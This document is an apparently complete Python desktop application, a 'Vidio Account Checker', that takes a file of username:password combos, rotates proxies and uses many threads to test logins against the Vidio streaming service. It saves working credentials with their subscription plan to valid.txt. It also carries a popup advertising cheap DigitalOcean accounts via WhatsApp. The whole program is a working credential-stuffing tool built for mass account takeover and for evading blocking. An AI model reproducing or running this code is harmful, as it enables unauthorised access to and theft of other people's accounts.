import os
import threading
import time
from queue import Queue
import customtkinter as ctk
from vidlib.vidlib import VidioAuth
import requests
import random
from PIL import Image
import webbrowser
from tkinter import messagebox
import tkinter as tk

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class VidioCheckerApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        self.title("Vidio Account Checker - Masanto")
        self.geometry("1200x800")
        self.resizable(True, True)
        
        # VR
        self.combo_list = []
        self.proxies = []
        self.threads = 50
        self.timeout = 30
        self.use_proxy = False
        self.valid = 0
        self.invalid = 0
        self.retries = 0
        self.lock = threading.Lock()
        self.queue = Queue()
        self.stop_flag = False
        self.total_accounts = 0
        self.checked = 0
        self.current_checking = ""
        self.running_threads = 0
        
        # UI Setup
        self.setup_ui()
        
        # Tampilkan popup DigitalOcean saat pertama kali dibuka (opsional)
        self.after(1000, self.show_digitalocean_popup)
    
    def setup_ui(self):
        # Configure grid
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        
        # Main container
        self.main_frame = ctk.CTkFrame(self)
        self.main_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        self.main_frame.grid_columnconfigure(0, weight=1)
        
        # Header
        self.header_frame = ctk.CTkFrame(self.main_frame, height=80)
        self.header_frame.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        
        self.title_label = ctk.CTkLabel(
            self.header_frame, 
            text="VIDIO ACCOUNT CHECKER", 
            font=("Arial", 24, "bold")
        )
        self.title_label.pack(pady=10, side="left", padx=20)
        
        # WhatsApp Button
        self.whatsapp_btn = ctk.CTkButton(
            self.header_frame,
            text="Info WhatsApp",
            command=lambda: webbrowser.open("https://wa.me/6282323434432"),  # Ganti dengan nomor Anda
            fg_color="#25D366",
            hover_color="#128C7E",
            width=120,
            height=30
        )
        self.whatsapp_btn.pack(side="right", padx=10)
        
        # DigitalOcean Button
        self.digitalocean_btn = ctk.CTkButton(
            self.header_frame,
            text="DigitalOcean Murah",
            command=self.show_digitalocean_popup,
            fg_color="#0080FF",
            hover_color="#0066CC",
            width=150,
            height=30
        )
        self.digitalocean_btn.pack(side="right", padx=10)
        
        # Configuration frame
        self.config_frame = ctk.CTkFrame(self.main_frame)
        self.config_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew")
        
        # Combo file input
        self.combo_label = ctk.CTkLabel(self.config_frame, text="Combo File:")
        self.combo_label.grid(row=0, column=0, padx=5, pady=5, sticky="w")
        
        self.combo_entry = ctk.CTkEntry(self.config_frame, width=300)
        self.combo_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        
        self.combo_browse = ctk.CTkButton(
            self.config_frame, 
            text="Browse", 
            width=80,
            command=self.browse_combo_file
        )
        self.combo_browse.grid(row=0, column=2, padx=5, pady=5)
        
        # Proxy configuration
        self.proxy_switch = ctk.CTkSwitch(
            self.config_frame, 
            text="Use Proxies",
            command=self.toggle_proxy_entry
        )
        self.proxy_switch.grid(row=1, column=0, padx=5, pady=5, sticky="w")
        
        self.proxy_entry = ctk.CTkEntry(self.config_frame, width=300, state="disabled")
        self.proxy_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        
        self.proxy_browse = ctk.CTkButton(
            self.config_frame, 
            text="Browse", 
            width=80,
            state="disabled",
            command=self.browse_proxy_file
        )
        self.proxy_browse.grid(row=1, column=2, padx=5, pady=5)
        
        # Threads configuration
        self.threads_label = ctk.CTkLabel(self.config_frame, text="Threads:")
        self.threads_label.grid(row=2, column=0, padx=5, pady=5, sticky="w")
        
        self.threads_slider = ctk.CTkSlider(
            self.config_frame, 
            from_=1, 
            to=100, 
            number_of_steps=99,
            command=self.update_threads_label
        )
        self.threads_slider.set(50)
        self.threads_slider.grid(row=2, column=1, padx=5, pady=5, sticky="ew")
        
        self.threads_value = ctk.CTkLabel(self.config_frame, text="50")
        self.threads_value.grid(row=2, column=2, padx=5, pady=5)
        
        # Control buttons
        self.start_button = ctk.CTkButton(
            self.config_frame, 
            text="Start Checking", 
            command=self.start_checking,
            fg_color="green",
            hover_color="dark green"
        )
        self.start_button.grid(row=3, column=0, padx=5, pady=10, sticky="ew")
        
        self.stop_button = ctk.CTkButton(
            self.config_frame, 
            text="Stop", 
            command=self.stop_checking,
            fg_color="red",
            hover_color="dark red",
            state="disabled"
        )
        self.stop_button.grid(row=3, column=1, padx=5, pady=10, sticky="ew")
        
        # Stats frame
        self.stats_frame = ctk.CTkFrame(self.main_frame)
        self.stats_frame.grid(row=2, column=0, padx=10, pady=10, sticky="ew")
        
        self.stats_labels = {
            "total": ctk.CTkLabel(self.stats_frame, text="Total: 0"),
            "checked": ctk.CTkLabel(self.stats_frame, text="Checked: 0"),
            "remaining": ctk.CTkLabel(self.stats_frame, text="Remaining: 0"),
            "valid": ctk.CTkLabel(self.stats_frame, text="Valid: 0", text_color="green"),
            "invalid": ctk.CTkLabel(self.stats_frame, text="Invalid: 0", text_color="red"),
            "retries": ctk.CTkLabel(self.stats_frame, text="Retries: 0", text_color="orange"),
            "threads": ctk.CTkLabel(self.stats_frame, text="Threads: 0"),
            "speed": ctk.CTkLabel(self.stats_frame, text="Speed: 0 acc/sec")
        }
        
        for i, (key, label) in enumerate(self.stats_labels.items()):
            label.grid(row=0, column=i, padx=10, pady=5)
        
        # Current checking card
        self.current_card = ctk.CTkFrame(self.main_frame, height=100)
        self.current_card.grid(row=3, column=0, padx=10, pady=10, sticky="ew")
        
        self.current_label = ctk.CTkLabel(
            self.current_card, 
            text="Currently Checking:", 
            font=("Arial", 14, "bold")
        )
        self.current_label.pack(pady=(10, 0))
        
        self.current_account = ctk.CTkLabel(
            self.current_card, 
            text="None", 
            font=("Arial", 16),
            text_color="yellow"
        )
        self.current_account.pack(pady=5)
        
        self.current_status = ctk.CTkLabel(
            self.current_card, 
            text="Status: Idle", 
            font=("Arial", 12)
        )
        self.current_status.pack(pady=(0, 10))
        
        # Results frame
        self.results_frame = ctk.CTkFrame(self.main_frame)
        self.results_frame.grid(row=4, column=0, padx=10, pady=10, sticky="nsew")
        self.main_frame.grid_rowconfigure(4, weight=1)
        
        self.results_label = ctk.CTkLabel(
            self.results_frame, 
            text="Results", 
            font=("Arial", 16, "bold")
        )
        self.results_label.pack(pady=5)
        
        self.results_text = ctk.CTkTextbox(self.results_frame, wrap="none")
        self.results_text.pack(expand=True, fill="both", padx=5, pady=5)
        
        # Status bar
        self.status_bar = ctk.CTkLabel(
            self, 
            text="Ready", 
            anchor="w",
            font=("Arial", 10)
        )
        self.status_bar.grid(row=1, column=0, padx=10, sticky="ew")
    
    def show_digitalocean_popup(self):
        # Buat popup modern dengan customtkinter
        popup = ctk.CTkToplevel(self)
        popup.title("Informasi DigitalOcean")
        popup.geometry("500x300")
        popup.resizable(False, False)
        popup.grab_set()  # Membuat popup modal
        
        # Frame utama
        main_frame = ctk.CTkFrame(popup)
        main_frame.pack(expand=True, fill="both", padx=10, pady=10)
        
        # Judul
        title_label = ctk.CTkLabel(
            main_frame, 
            text="Seller DigitalOcean Termurah", 
            font=("Arial", 18, "bold")
        )
        title_label.pack(pady=(10, 5))
        
        # Konten
        content_label = ctk.CTkLabel(
            main_frame,
            text="Kami menyediakan layanan DigitalOcean dengan harga termurah:\n\n"
                 "- 10 Droplet mulai dari Rp100.000/Acc\n"
                 "- Akun DigitalOcean siap pakai\n"
                 "- Garansi 100% aman\n\n"
                 "Hubungi kami via WhatsApp untuk informasi lebih lanjut",
            wraplength=400,
            justify="left"
        )
        content_label.pack(pady=10, padx=10)
        
        # Tombol WhatsApp
        whatsapp_btn = ctk.CTkButton(
            main_frame,
            text="Hubungi via WhatsApp",
            command=lambda: webbrowser.open("https://wa.me/6282323434432"),
            fg_color="#25D366",
            hover_color="#128C7E"
        )
        whatsapp_btn.pack(pady=10)
        
        # Tombol Tutup
        close_btn = ctk.CTkButton(
            main_frame,
            text="Tutup",
            command=popup.destroy
        )
        close_btn.pack(pady=5)
    
    def toggle_proxy_entry(self):
        if self.proxy_switch.get():
            self.proxy_entry.configure(state="normal")
            self.proxy_browse.configure(state="normal")
            self.use_proxy = True
        else:
            self.proxy_entry.configure(state="disabled")
            self.proxy_browse.configure(state="disabled")
            self.use_proxy = False
    
    def update_threads_label(self, value):
        self.threads = int(value)
        self.threads_value.configure(text=str(self.threads))
    
    def browse_combo_file(self):
        filepath = ctk.filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        if filepath:
            self.combo_entry.delete(0, "end")
            self.combo_entry.insert(0, filepath)
    
    def browse_proxy_file(self):
        filepath = ctk.filedialog.askopenfilename(
            title="Select Proxy File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        if filepath:
            self.proxy_entry.delete(0, "end")
            self.proxy_entry.insert(0, filepath)
    
    def update_status(self, message):
        self.status_bar.configure(text=message)
    
    def update_stats(self):
        self.stats_labels["total"].configure(text=f"Total: {self.total_accounts}")
        self.stats_labels["checked"].configure(text=f"Checked: {self.checked}")
        self.stats_labels["remaining"].configure(text=f"Remaining: {self.total_accounts - self.checked}")
        self.stats_labels["valid"].configure(text=f"Valid: {self.valid}")
        self.stats_labels["invalid"].configure(text=f"Invalid: {self.invalid}")
        self.stats_labels["retries"].configure(text=f"Retries: {self.retries}")
        self.stats_labels["threads"].configure(text=f"Threads: {self.running_threads}")
    
    def update_current_checking(self, account, status, color="white"):
        self.current_account.configure(text=account, text_color=color)
        self.current_status.configure(text=f"Status: {status}")
        
        if "Valid" in status:
            self.current_card.configure(border_color="green", border_width=2)
        elif "Invalid" in status:
            self.current_card.configure(border_color="red", border_width=2)
        elif "Retry" in status:
            self.current_card.configure(border_color="orange", border_width=2)
        else:
            self.current_card.configure(border_width=0)
    
    def add_result(self, text, color="white"):
        self.results_text.configure(state="normal")
        self.results_text.insert("end", text + "\n", color)
        self.results_text.configure(state="disabled")
        self.results_text.see("end")
    
    def get_random_proxy(self):
        if not self.proxies:
            return None
        return random.choice(self.proxies)
    
    def check_account(self, username, password):
        self.current_checking = f"{username}:{password}"
        
        # Update UI
        self.after(0, self.update_current_checking, self.current_checking, "Checking...", "yellow")
        
        proxy = self.get_random_proxy() if self.use_proxy else None
        proxy_dict = None
        
        if proxy:
            if 'http' not in proxy and 'https' not in proxy:
                proxy = f'http://{proxy}'
            proxy_dict = {
                'http': proxy,
                'https': proxy
            }
        
        try:
            vidio = VidioAuth()
            if proxy_dict:
                vidio.session.proxies = proxy_dict
            
            success, message = vidio.login(username, password)
            
            with self.lock:
                self.checked += 1
                if success:
                    self.valid += 1
                    transaction_data = vidio.get_transaction_history()
                    plan = transaction_data.get('Plan', 'Unknown')
                    aktif = transaction_data.get('Aktif', 'Unknown')
                    
                    result = f"[VALID] {username}:{password}:{plan}:{aktif}"
                    self.after(0, self.add_result, result, "green")
                    self.after(0, self.update_current_checking, self.current_checking, "Valid", "green")
                    self.save_result('valid.txt', result)
                else:
                    self.invalid += 1
                    result = f"[INVALID] {username}:{password}"
                    self.after(0, self.add_result, result, "red")
                    self.after(0, self.update_current_checking, self.current_checking, "Invalid", "red")
                
                self.after(0, self.update_stats)
        except Exception as e:
            with self.lock:
                self.retries += 1
                result = f"[RETRY] {self.current_checking} | Error: {str(e)}"
                self.after(0, self.add_result, result, "orange")
                self.after(0, self.update_current_checking, self.current_checking, f"Retry: {str(e)}", "orange")
                self.after(0, self.update_stats)
        finally:
            self.current_checking = ""
    
    def save_result(self, filename, content):
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content + '\n')
    
    def worker(self):
        with self.lock:
            self.running_threads += 1
            self.after(0, self.update_stats)
        
        while not self.stop_flag:
            try:
                combo = self.queue.get_nowait()
                username, password = combo.split(':', 1)
                self.check_account(username.strip(), password.strip())
                self.queue.task_done()
            except:
                break
        
        with self.lock:
            self.running_threads -= 1
            self.after(0, self.update_stats)
    
    def start_checking(self):
        combo_path = self.combo_entry.get()
        if not os.path.exists(combo_path):
            self.update_status("Error: Combo file not found!")
            return
        
        if not self.load_combo(combo_path):
            self.update_status("Error loading combo file!")
            return
        
        if self.use_proxy:
            proxy_path = self.proxy_entry.get()
            if not os.path.exists(proxy_path):
                self.update_status("Error: Proxy file not found!")
                return
            if not self.load_proxies(proxy_path):
                self.update_status("Error loading proxy file!")
                return
        
        # Reset stats
        self.valid = 0
        self.invalid = 0
        self.retries = 0
        self.checked = 0
        self.stop_flag = False
        
        # Clear results
        self.results_text.configure(state="normal")
        self.results_text.delete("1.0", "end")
        self.results_text.configure(state="disabled")
        
        # Update UI
        self.start_button.configure(state="disabled")
        self.stop_button.configure(state="normal")
        self.update_status("Checking started...")
        self.update_stats()
        
        # Start checking
        for combo in self.combo_list:
            self.queue.put(combo)
            
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
        
        # Start monitoring thread
        threading.Thread(target=self.monitor_queue, daemon=True).start()
    
    def stop_checking(self):
        self.stop_flag = True
        self.start_button.configure(state="normal")
        self.stop_button.configure(state="disabled")
        self.update_status("Stopping... Please wait")
    
    def monitor_queue(self):
        while not self.queue.empty() and not self.stop_flag:
            time.sleep(0.5)
        
        if not self.stop_flag:
            self.after(0, self.update_status, "Checking completed!")
            self.after(0, lambda: self.start_button.configure(state="normal"))
            self.after(0, lambda: self.stop_button.configure(state="disabled"))
    
    def load_combo(self, path):
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                self.combo_list = [line.strip() for line in f if ':' in line]
            self.total_accounts = len(self.combo_list)
            return True
        except Exception as e:
            self.after(0, self.update_status, f"Error loading combo file: {e}")
            return False
    
    def load_proxies(self, path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            return True
        except Exception as e:
            self.after(0, self.update_status, f"Error loading proxy file: {e}")
            return False

if __name__ == "__main__":
    app = VidioCheckerApp()
    app.mainloop()